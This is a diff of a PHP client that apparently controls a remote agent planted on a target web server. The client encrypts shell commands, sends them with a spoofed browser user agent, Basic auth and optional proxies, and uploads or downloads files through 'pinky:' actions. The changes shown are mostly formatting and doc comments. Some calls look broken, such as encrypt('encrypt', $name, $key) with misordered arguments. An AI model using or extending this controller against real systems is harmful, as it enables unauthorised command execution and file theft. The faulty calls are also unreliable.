@@ -3,9 +3,9 @@
 /**
  * Encrypts a string
  *
- * @param string $plaintext  Raw string to be encrypted
- * @param string $secret_key  Encryption key, also required for decryption
- * @param mixed  $method OpenSSL or mcrypt (legacy)
+ * @param string $plaintext Raw string to be encrypted
+ * @param string $secret_key Encryption key, also required for decryption
+ * @param mixed $method OpenSSL or mcrypt (legacy)
  *
  * @return string Raw data encrypted with a key
  */
@@ -16,9 +16,9 @@ function encrypt($plaintext, $secret_key, $method = 'openssql')
 
     $ivlen = openssl_cipher_iv_length($cipher);
     $iv = openssl_random_pseudo_bytes($ivlen);
-    $ciphertext_raw = openssl_encrypt($plaintext, $cipher, $key, $options=OPENSSL_RAW_DATA, $iv);
-    $hmac = hash_hmac('sha256', $ciphertext_raw, $key, $as_binary=true);
-    $ciphertext = base64_encode( $iv.$hmac.$ciphertext_raw );
+    $ciphertext_raw = openssl_encrypt($plaintext, $cipher, $key, $options = OPENSSL_RAW_DATA, $iv);
+    $hmac = hash_hmac('sha256', $ciphertext_raw, $key, $as_binary = true);
+    $ciphertext = base64_encode($iv . $hmac . $ciphertext_raw);
 
     return $ciphertext;
 }
@@ -26,29 +26,37 @@ function encrypt($plaintext, $secret_key, $method = 'openssql')
 /**
  * Decrypts an encrypted string
  *
- * @param string $ciphertext  Encrypted text to be decrypted
- * @param string $secret_key  Encryption key, also required for decryption
- * @param mixed  $method OpenSSL or mcrypt (legacy)
+ * @param string $ciphertext Encrypted text to be decrypted
+ * @param string $secret_key Encryption key, also required for decryption
+ * @param mixed $method OpenSSL or mcrypt (legacy)
  *
  * @return string Raw data encrypted with a key
  */
-function decrypt($ciphertext, $secret_key, $method = 'openssql')
+function decrypt($ciphertext, $secret_key)
 {
-    $cipher="AES-256-CBC";
+    $cipher = "AES-256-CBC";
     $key = hash_pbkdf2('sha256', $secret_key, '', 10000, 0, true);
 
     $c = base64_decode($ciphertext);
     $ivlen = openssl_cipher_iv_length($cipher);
     $iv = substr($c, 0, $ivlen);
-    $hmac = substr($c, $ivlen, $sha2len=32);
-    $ciphertext_raw = substr($c, $ivlen+$sha2len);
-    $original_plaintext = openssl_decrypt($ciphertext_raw, $cipher, $key, $options=OPENSSL_RAW_DATA, $iv);
-    $calcmac = hash_hmac('sha256', $ciphertext_raw, $key, $as_binary=true);
+    $hmac = substr($c, $ivlen, $sha2len = 32);
+    $ciphertext_raw = substr($c, $ivlen + $sha2len);
+    $original_plaintext = openssl_decrypt($ciphertext_raw, $cipher, $key, $options = OPENSSL_RAW_DATA, $iv);
+    $calcmac = hash_hmac('sha256', $ciphertext_raw, $key, $as_binary = true);
 
     return hash_equals($hmac, $calcmac) ? $original_plaintext : null;
 }
 
-
+/**
+ * Build the request to be sent
+ *
+ * @param string $cmd Command
+ * @param string $path Current path of the agent
+ * @param string $key The encription key
+ *
+ * @return array
+ */
 function make_request($cmd, $path, $key)
 {
     $data = array(
@@ -56,9 +64,8 @@ function make_request($cmd, $path, $key)
     );
     $position = strpos($cmd, 'pinky:');
     if ($position === false) {
-        $data['c'] = encrypt(base64_encode($cmd) , $key);
-    }
-    else {
+        $data['c'] = encrypt(base64_encode($cmd), $key);
+    } else {
         $cmd = str_replace('pinky:', '', $cmd);
         $input = explode(' ', $cmd);
         $action = $input[0];
@@ -67,37 +74,34 @@ function make_request($cmd, $path, $key)
             $data['f'] = array(); // files
             $data['f']['u'] = array(); // urls
             $data['f']['b'] = array(); // binaries
-            foreach($input as $entry) {
+            foreach ($input as $entry) {
                 if (filter_var($entry, FILTER_VALIDATE_URL)) {
                     $parsed = parse_url($entry);
                     $name = base64_encode(basename($parsed['path']));
                     $url = base64_encode($entry);
                     $array = array(
-                        'n' => encrypt('encrypt', $name, $key) ,
+                        'n' => encrypt('encrypt', $name, $key),
                         'p' => encrypt('encrypt', $url, $key)
                     );
                     array_push($data['f']['u'], $array);
-                }
-                else {
+                } else {
                     $file = file_to_base64($entry);
                     if (!is_null($file)) {
                         $name = base64_encode(basename(realpath($entry)));
                         $array = array(
-                            'n' => encrypt('encrypt', $name, $key) ,
+                            'n' => encrypt('encrypt', $name, $key),
                             'p' => encrypt('encrypt', $file, $key)
                         );
                         array_push($data['f']['b'], $array);
-                    }
-                    else {
+                    } else {
                         echo " [!] ERROR: {$entry} doesn't exists or isn't readable.\n";
                     }
                 }
             }
-        }
-        elseif ($action == 'download') {
+        } elseif ($action == 'download') {
             $data['f'] = array();
             $data['f']['d'] = array(); // files to download
-            foreach($input as $entry) {
+            foreach ($input as $entry) {
                 $name = base64_encode($entry);
                 array_push($data['f']['d'], encrypt('encrypt', $name, $key));
             }
@@ -107,7 +111,18 @@ function make_request($cmd, $path, $key)
     return $data;
 }
 
-function send_request($url, $data, $login, $password, $proxy = array() , $cookies = null)
+/**
+ * Send que request to the agent and return the response
+ *
+ * @param string $url URL of the target
+ * @param array $data Data to be sent
+ * @param string $login Login user
+ * @param string $password Login password
+ * @param array $proxy Proxy information
+ * @param string $cookies Cookies to be used
+ * @return array
+ */
+function send_request($url, $data, $login, $password, $proxy = array(), $cookies = null)
 {
     $url_components = parse_url($url);
     $b = 'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0';
@@ -119,7 +134,7 @@ function send_request($url, $data, $login, $password, $proxy = array() , $cookie
         'Accept-Encoding: gzip, deflate, br',
         'Upgrade-Insecure-Requests: 1',
         'Cache-Control: max-age=0',
-        'Authorization: Basic ' . base64_encode("{$login}:{$password}") ,
+        'Authorization: Basic ' . base64_encode("{$login}:{$password}"),
         'Content-Type: application/x-www-form-urlencoded',
         'Host: ' . $url_components['host']
     );
@@ -168,6 +183,12 @@ function send_request($url, $data, $login, $password, $proxy = array() , $cookie
 }
 
 
+/**
+ * Validate a json config file
+ *
+ * @param string $config Config file path
+ * @return bool
+ */
 function is_json_valid($config)
 {
     if (is_null($config) || !isset($config['key']) || !isset($config['url']) || !isset($config['login'])) {
@@ -181,6 +202,12 @@ function is_json_valid($config)
     return true;
 }
 
+/**
+ * Convert a file to a base64 string
+ *
+ * @param string $file File path
+ * @return null|string
+ */
 function file_to_base64($file)
 {
     if (file_exists($file) && is_readable($file)) {
@@ -190,6 +217,14 @@ function file_to_base64($file)
     return null;
 }
 
+/**
+ * Convert base64 string to a binary file and return the filename
+ *
+ * @param string $base64_string File encoded base64 based
+ * @param string $path
+ * @param string $output_file
+ * @return string
+ */
 function base64_to_file($base64_string, $path, $output_file)
 {
     if (!is_writable($path)) {
@@ -203,6 +238,11 @@ function base64_to_file($base64_string, $path, $output_file)
     return $output_file;
 }
 
+/**
+ * Print the welcome meessage
+ *
+ * @param $version
+ */
 function print_welcome($version)
 {
     $author = "David Tavarez";
@@ -252,7 +292,8 @@ EOT;
  * @return string
  * @throws Exception
  */
-function random_str($length, $keyspace = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') {
+function random_str($length, $keyspace = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
+{
     $str = '';
     $max = mb_strlen($keyspace, '8bit') - 1;
     if ($max < 1) {
